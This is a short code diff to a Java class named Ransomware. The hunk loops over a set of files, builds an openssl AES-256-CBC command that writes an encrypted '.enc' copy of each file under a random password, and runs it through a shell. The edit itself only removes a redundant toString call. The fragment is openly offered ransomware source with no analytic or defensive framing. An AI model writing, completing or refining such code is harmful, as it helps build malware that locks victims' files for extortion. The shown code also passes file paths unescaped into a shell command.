@@ -32,7 +32,7 @@ public class Ransomware {
         for (File file : files) {
             String path = file.getAbsolutePath();
             String new_path = path + ".enc";
-            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password.toString() + "\"";
+            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password + "\"";
             System.out.println(command);
 
             builder.command("sh", "-c", command);
